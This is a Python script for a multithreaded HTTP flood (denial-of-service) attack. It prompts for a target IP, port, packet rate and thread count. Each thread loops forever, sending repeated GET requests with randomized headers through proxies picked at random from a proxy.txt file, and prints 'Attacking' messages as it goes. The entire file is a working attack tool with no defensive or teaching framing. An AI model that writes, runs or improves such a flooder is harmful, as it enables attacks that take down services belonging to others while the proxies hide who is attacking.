import socket
import threading
import random

def read_proxies(file_path='proxy.txt'):
    with open(file_path, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

def generate_request(ip, port):
    useragents = ["Mozilla/5.0", "Safari/537.36", "Chrome/91.0"]
    referrers = ["https://example.com", "https://another.com"]
    acceptalls = ["*/*", "text/html,application/xhtml+xml"]
    lolagents = ["", "some-lol-agent"]

    request_lines = [
        f"GET / HTTP/1.1",
        f"Host: {ip}:{port}",
        f"User-Agent: {random.choice(useragents)}",
        f"Accept: {random.choice(acceptalls)}",
        f"Referer: {random.choice(referrers)}",
        f"LolAccept: {random.choice(lolagents)}",
        "Content-Type: application/x-www-form-urlencoded",
        "Content-Length: 0",
        "Connection: Keep-Alive",
        "\r\n"
    ]

    return "\r\n".join(request_lines)

def flood_target(ip, port, packet_rate, proxies):
    request = generate_request(ip, port)
    
    while True:
        proxy = random.choice(proxies).split(':')
        proxy_ip, proxy_port = proxy[0], int(proxy[1])
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((proxy_ip, proxy_port))
                s.sendall(request.encode())
                for _ in range(packet_rate):
                    s.sendall(request.encode())
            print(f"[+] Attacking {ip}:{port} through proxy {proxy_ip}:{proxy_port}")
        except (socket.error, IndexError) as e:
            print(f"[+] Error: {e}")

def start_flooding(ip, port, packet_rate, num_threads, proxies):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=flood_target, args=(ip, port, packet_rate, proxies))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    ip = input('[+] Target IP: ')
    port = int(input('[+] Port: '))
    packet_rate = int(input('[+] Packet/s: '))
    num_threads = int(input('[+] Number of Threads: '))

    proxies = read_proxies()  # Default path is 'proxy.txt'
    start_flooding(ip, port, packet_rate, num_threads, proxies)
    